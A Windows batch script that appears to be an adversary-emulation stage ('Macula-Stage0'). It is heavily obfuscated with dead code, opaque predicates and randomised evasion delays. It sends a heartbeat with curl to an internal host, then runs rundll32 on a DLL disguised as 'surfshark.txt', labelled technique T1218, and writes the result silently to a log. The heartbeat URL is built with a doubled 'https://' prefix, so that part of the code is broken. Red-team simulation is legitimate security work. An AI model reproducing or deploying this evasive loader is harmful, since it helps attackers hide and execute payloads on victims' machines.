@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER obfuscate these strings)
SET fpxtm=Macula-Stage0-7556
SET jkczn=https://10.0.0.49
SET wgmsh=https://10.0.0.49/stage/2/icon.png?7556-7
SET bdlrt=BALAM-S2BO
SET tvzqp=7
SET hcqrd=surfshark.txt
SET mlbyf=7556

REM Initial random delay
SET /A jklpr=%RANDOM% %% 30 + 30
timeout /t !jklpr! /nobreak >nul

REM Obfuscated control flow begins
SET zxqwn=0
GOTO pqrsx

REM Dead code block (unreachable)
:tyuiop
ECHO Never executed >nul
GOTO END
SET fake=deadcode
EXIT /B 1

:pqrsx
REM State dispatcher
IF !zxqwn!==0 GOTO mnbvcf
IF !zxqwn!==17 GOTO lkjhgf
IF !zxqwn!==42 GOTO poiuytr
IF !zxqwn!==55 GOTO qwerty
IF !zxqwn!==73 GOTO asdfgh
IF !zxqwn!==88 GOTO END

REM More dead code
:dead_abc
PING -n 2 127.0.0.1 >nul
GOTO END

REM Initial setup
:mnbvcf
REM Set log path
SET logpath=!APPDATA!\!tvzqp!\macula-simulations.log
ping -n 11 127.0.0.1 >nul
SET zxqwn=17
GOTO pqrsx

REM Dead code with fake operation
:fake_op
ECHO This is fake >nul
SET fakevar=1
GOTO END

REM Step 1: Check server availability
:lkjhgf
REM Opaque predicate (always true)
IF 1==1 (
    SET zxqwn=42
    GOTO real_heartbeat
) ELSE (
    GOTO fake_op
)

:real_heartbeat
SET curlcmd=curl -k -s -o nul https://!wgmsh!/
%curlcmd% || (
    SET hbrslt=0
    SET hberr=connection_failed
)
SET zxqwn=42
GOTO pqrsx

REM Random delay
:poiuytr
SET /A rnddelay=%RANDOM% %% 15 + 5
CHOICE /C Y /N /D Y /T !rnddelay! >nul
SET zxqwn=55
GOTO pqrsx

REM More dead code scattering
:junk_block
REM Never reached
FOR /L %%i IN (1,1,5) DO (
    ECHO Junk
)
GOTO END

REM Step 2: Execute DLL via Rundll32 (T1218)
:qwerty
REM TTP: T1218 - Signed Binary Proxy Execution
SET ttp_id=T1218
SET ttp_name=Signed Binary Proxy Execution
SET exec_result=0
SET exec_err=

REM Always false condition with dead branch
IF 0==1 (
    GOTO fake_exec
) ELSE (
    GOTO real_exec
)

:fake_exec
ECHO Fake execution path >nul
EXIT /B 1

:real_exec
REM Obfuscated DLL execution string
SET dllpath=!hcqrd!
SET dllmain=DllMain
SET rndcmd=!SystemRoot!\System32\rundll32.exe !dllpath!,!dllmain!

REM Execute with error handling
!rndcmd! >nul 2>&1
IF !ERRORLEVEL!==0 (
    SET exec_result=1
    SET exec_err=
) ELSE (
    SET exec_result=0
    SET exec_err=exec_failed
)

REM Delay before logging
timeout /t 8 /nobreak >nul
SET zxqwn=73
GOTO pqrsx

REM Final step: Log TTP execution
:asdfgh
REM Build timestamp
FOR /F "tokens=2-4 delims=/ " %%a IN ('echo !DATE!') DO SET yyyymmdd=%%c-%%a-%%b
SET hhmmss=!TIME!
SET timestamp=!yyyymmdd! !hhmmss!

REM Construct log line
SET logline=[!timestamp!][!bdlrt!]: !tvzqp!-!mlbyf!-!ttp_id!^|!ttp_name!=!exec_result!:!exec_err!

REM Append to log with silent error suppression
ECHO !logline! >> "!logpath!" 2>nul || (
    REM Silent fail on logging error
    SET junk=1
)

timeout /t 12 /nobreak >nul
SET zxqwn=88
GOTO pqrsx

REM Final dead code block
:never_reached
SET /A nevervar=1+1
IF !nevervar!==2 (
    GOTO END
)

REM Clean exit
:END
REM Final random delay
SET /A finaldelay=%RANDOM% %% 10 + 5
ping -n !finaldelay! 127.0.0.1 >nul
EXIT /B 0